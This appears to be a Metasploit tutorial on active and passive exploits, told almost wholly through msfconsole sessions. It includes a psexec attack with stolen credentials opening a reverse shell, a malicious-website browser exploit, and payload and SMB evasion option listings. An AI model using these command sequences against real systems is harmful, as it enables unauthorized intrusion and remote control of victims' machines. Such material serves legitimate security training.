# WORKING WITH ACTIVE AND PASSIVE EXPLOITS IN METASPLOIT

- All exploits in the Metasploit Framework will fall into two categories: active and passive.

  - ## ACTIVE EXPLOITS

    - Active exploits will exploit a specific host, run until completion, and then exit.

      - Brute-force modules will exit when a shell opens from the victim.
      - Module execution stops if an error is encountered.
      - You can force an active module to the background by passing ‘-j’ to the exploit command:

            msf exploit(ms08_067_netapi) > exploit -j
            [*] Exploit running as background job.
            msf exploit(ms08_067_netapi) >

      - The following example makes use of a previously acquired set of credentials to exploit and gain a reverse shell on the target system.

            msf > use exploit/windows/smb/psexec
            msf exploit(psexec) > set RHOST 192.168.1.100
            RHOST => 192.168.1.100
            msf exploit(psexec) > set PAYLOAD windows/shell/reverse_tcp
            PAYLOAD => windows/shell/reverse_tcp
            msf exploit(psexec) > set LHOST 192.168.1.5
            LHOST => 192.168.1.5
            msf exploit(psexec) > set LPORT 4444
            LPORT => 4444
            msf exploit(psexec) > set SMBUSER victim
            SMBUSER => victim
            msf exploit(psexec) > set SMBPASS s3cr3t
            SMBPASS => s3cr3t
            msf exploit(psexec) > exploit

            [*] Connecting to the server...
            [*] Started reverse handler
            [*] Authenticating as user 'victim'...
            [*] Uploading payload...
            [*] Created \hikmEeEM.exe...
            [*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\svcctl] ...
            [*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\svcctl] ...
            [*] Obtaining a service manager handle...
            [*] Creating a new service (ciWyCVEp - "MXAVZsCqfRtZwScLdexnD")...
            [*] Closing service handle...
            [*] Opening service...
            [*] Starting the service...
            [*] Removing the service...
            [*] Closing service handle...
            [*] Deleting \hikmEeEM.exe...
            [*] Sending stage (240 bytes)
            [*] Command shell session 1 opened (192.168.1.5:4444 -> 192.168.1.100:1073)

            Microsoft Windows XP [Version 5.1.2600]
            (C) Copyright 1985-2001 Microsoft Corp.

            C:\WINDOWS\system32>

    - ## PASSIVE EXPLOITS

      - Passive exploits wait for incoming hosts and exploit them as they connect.

        - Passive exploits almost always focus on clients such as web browsers, FTP clients, etc.
        - They can also be used in conjunction with email exploits, waiting for connections.
        - Passive exploits report shells as they happen can be enumerated by passing ‘-l’ to the sessions command. Passing ‘-i’ will interact with a shell.

                msf exploit(ani_loadimage_chunksize) > sessions -l

                Active sessions
                ===============

                Id  Description  Tunnel
                --  -----------  ------
                1   Meterpreter  192.168.1.5:52647 -> 192.168.1.100:4444

                msf exploit(ani_loadimage_chunksize) > sessions -i 1
                [*] Starting interaction with 1...

                meterpreter >

        - The following output shows the setup to exploit the animated cursor vulnerability. The exploit does not fire until a victim browses to our malicious website.

                    msf > use exploit/windows/browser/ani_loadimage_chunksize
                    msf exploit(ani_loadimage_chunksize) > set URIPATH /
                    URIPATH => /
                    msf exploit(ani_loadimage_chunksize) > set PAYLOAD windows/shell/reverse_tcp
                    PAYLOAD => windows/shell/reverse_tcp
                    msf exploit(ani_loadimage_chunksize) > set LHOST 192.168.1.5
                    LHOST => 192.168.1.5
                    msf exploit(ani_loadimage_chunksize) > set LPORT 4444
                    LPORT => 4444
                    msf exploit(ani_loadimage_chunksize) > exploit
                    [*] Exploit running as background job.

                    [*] Started reverse handler
                    [*] Using URL: http://0.0.0.0:8080/
                    [*]  Local IP: http://192.168.1.5:8080/
                    [*] Server started.
                    msf exploit(ani_loadimage_chunksize) >
                    [*] Attempting to exploit ani_loadimage_chunksize
                    [*] Sending HTML page to 192.168.1.100:1077...
                    [*] Attempting to exploit ani_loadimage_chunksize
                    [*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to 192.168.1.100:1077...
                    [*] Sending stage (240 bytes)
                    [*] Command shell session 2 opened (192.168.1.5:4444 -> 192.168.1.100:1078)

                    msf exploit(ani_loadimage_chunksize) > sessions -i 2
                    [*] Starting interaction with 2...

                    Microsoft Windows XP [Version 5.1.2600]
                    (C) Copyright 1985-2001 Microsoft Corp.

                    C:\Documents and Settings\victim\Desktop>

# USING EXPLOITS IN METASPLOIT

- Selecting an exploit in Metasploit adds the exploit and check commands to msfconsole.

        msf > use  exploit/windows/smb/ms09_050_smb2_negotiate_func_index
        msf exploit(ms09_050_smb2_negotiate_func_index) > help
        ...snip...
        Exploit Commands
        ================

            Command       Description
            -------       -----------
            check         Check to see if a target is vulnerable
            exploit       Launch an exploit attempt
            pry           Open a Pry session on the current module
            rcheck        Reloads the module and checks if the target is vulnerable
            reload        Just reloads the module
            rerun         Alias for rexploit
            rexploit      Reloads the module and launches an exploit attempt
            run           Alias for exploit

        msf exploit(ms09_050_smb2_negotiate_func_index) >

  ## SHOW

  - Using an exploit also adds more options to the show command.

  - ## MSF Exploit Targets

         msf exploit(ms09_050_smb2_negotiate_func_index) > show targets

         Exploit targets:

         Id  Name
         --  ----
         0   Windows Vista SP1/SP2 and Server 2008 (x86)

  - ## MSF Exploit Payloads

          msf exploit(ms09_050_smb2_negotiate_func_index) > show payloads

          Compatible Payloads
          ===================

          Name                              Disclosure Date  Rank    Description
          ----                              ---------------  ----    -----------
          generic/custom                                     normal  Custom Payload
          generic/debug_trap                                 normal  Generic x86 Debug Trap
          generic/shell_bind_tcp                             normal  Generic Command Shell, Bind TCP Inline
          generic/shell_reverse_tcp                          normal  Generic Command Shell, Reverse TCP Inline
          generic/tight_loop                                 normal  Generic x86 Tight Loop
          windows/adduser                                    normal  Windows Execute net user /ADD
          ...snip...

  - ## MSF Exploit Options

          msf exploit(ms09_050_smb2_negotiate_func_index) > show options

          Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

          Name   Current Setting  Required  Description
          ----   ---------------  --------  -----------
          RHOST                   yes       The target address
          RPORT  445              yes       The target port (TCP)
          WAIT   180              yes       The number of seconds to wait for the attack to complete.


          Exploit target:

          Id  Name
          --  ----
          0   Windows Vista SP1/SP2 and Server 2008 (x86)

    - ## ADVANCED

            msf exploit(ms09_050_smb2_negotiate_func_index) > show advanced

            Module advanced options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

            Name                    Current Setting    Required  Description
            ----                    ---------------    --------  -----------
            CHOST                                      no        The local client address
            CPORT                                      no        The local client port
            ConnectTimeout          10                 yes       Maximum number of seconds to establish a TCP connection
            ContextInformationFile                     no        The information file that contains context information
            DisablePayloadHandler   false              no        Disable the handler code for the selected payload
            EnableContextEncoding   false              no        Use transient context when encoding payloads
            ...snip...

    - ## EVASION

            msf exploit(ms09_050_smb2_negotiate_func_index) > show evasion
            Module evasion options:

            Name                           Current Setting  Required  Description
            ----                           ---------------  --------  -----------
            SMB::obscure_trans_pipe_level  0                yes       Obscure PIPE string in TransNamedPipe (level 0-3)
            SMB::pad_data_level            0                yes       Place extra padding between headers and data (level 0-3)
            SMB::pad_file_level            0                yes       Obscure path names used in open/create (level 0-3)
            SMB::pipe_evasion              false            yes       Enable segmented read/writes for SMB Pipes
            SMB::pipe_read_max_size        1024             yes       Maximum buffer size for pipe reads
            SMB::pipe_read_min_size        1                yes       Minimum buffer size for pipe reads
            SMB::pipe_write_max_size       1024             yes       Maximum buffer size for pipe writes
            SMB::pipe_write_min_size       1                yes       Minimum buffer size for pipe writes
            TCP::max_send_size             0                no        Maxiumum tcp segment size.  (0 = disable)
            TCP::send_delay                0                no        Delays inserted before every send.  (0 = disable)
